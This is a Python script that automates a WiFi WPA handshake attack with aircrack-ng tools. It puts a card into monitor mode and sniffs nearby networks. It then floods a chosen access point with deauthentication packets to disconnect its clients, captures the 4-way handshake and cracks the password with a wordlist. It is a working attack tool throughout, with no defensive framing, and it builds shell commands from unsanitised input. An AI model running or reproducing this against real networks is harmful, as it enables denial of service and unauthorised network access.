#!/usr/bin/env python

import os
import subprocess
from time import sleep

#Varaible Hard-Coded Values
number_deauth_packets = 20

if os.geteuid() != 0:
    print("\nThis script must be run as root\n")
    exit(0)

def network_setup(int_name):
    try:
        os.system("airmon-ng check kill")
        os.system("/etc/init.d/avahi-daemon stop")
        os.system("ifconfig %s down" %int_name)
        os.system("airmon-ng start %s" %int_name)
        cmd = "ifconfig | grep mon | awk -F ':' '{print $1}' | awk '{print $1}'"
        int_name = str(os.popen(cmd).read()).strip('\n')
        return int_name
    except KeyboardInterrupt:
        print ("The network setup failed, run the script again")

def network_teardown(int_name):
    try:
        os.system("airmon-ng stop %s" %int_name)
        os.system("service network-manager restart")
    except NameError:
        print("Network Interface \"%s\" does not exist" %int_name)

def network_sniff(interface_name):
    try:
        os.system("airodump-ng -a -w testcap %s" %interface_name)
    except KeyboardInterrupt:
        print ("Network sniffing done")

def deauth_bomb(int_name, number_deauth_packets):
    try:
        ssid_name = str(raw_input("Input the first 3 characters of the ssid you are targetting (Case Sensitive): "))

        cmd = "cat testcap-01.csv | grep " + ssid_name + " | awk '{print $1}' | awk -F',' 'NR==1{print $1}'"
        bssid = str(os.popen(cmd).read()).strip('\n')

        cmd = "cat testcap-01.csv | grep " + bssid + " | awk '{print $6}' | awk -F',' 'NR==1{print $1}'"
        channel = str(os.popen(cmd).read()).split('\n')[0]

        cmd = "iwconfig " + int_name + " channel " + channel
        os.system(cmd)

        cmd = "aireplay-ng -0 " + str(number_deauth_packets) + " -a " + bssid + " " + int_name
        subprocess.call(cmd, shell=True)
        return bssid, channel

    except KeyboardInterrupt:
        return bssid

def capture_handshake(bssid, int_name, channel):
    try:
        os.system("airodump-ng --bssid %s --channel %s -w captured_packet %s" %(bssid, channel, int_name))
    except KeyboardInterrupt:
        print ("nothing")

if __name__ == "__main__":

    os.system("rm testcap*")
    os.system("rm captured*")
    os.system("iwconfig")

    interface_name = raw_input("Input the name of your wireless interface: ")

    #print ("\nSetting up Nic Parameters")
    int_name = network_setup(interface_name)

    #print ("\nsniffing network, press CTRL+C when you see a network you want to target")
    network_sniff(int_name)

    #print ("\nWith user input, sending De-Auth bomb")
    bssid, channel = deauth_bomb(int_name, number_deauth_packets)

    #print ("Capturing 4-way handshake, targeting " + str(bssid))
    capture_handshake(bssid, int_name, channel)

    #print("\nResetting Nic Parameters and restarting Network-Manager.\n")
    network_teardown(int_name)

    cmd = "aircrack-ng -w /usr/share/john/password.lst -b " + bssid + " captured_packet-01.cap"
    subprocess.call(cmd, shell=True)
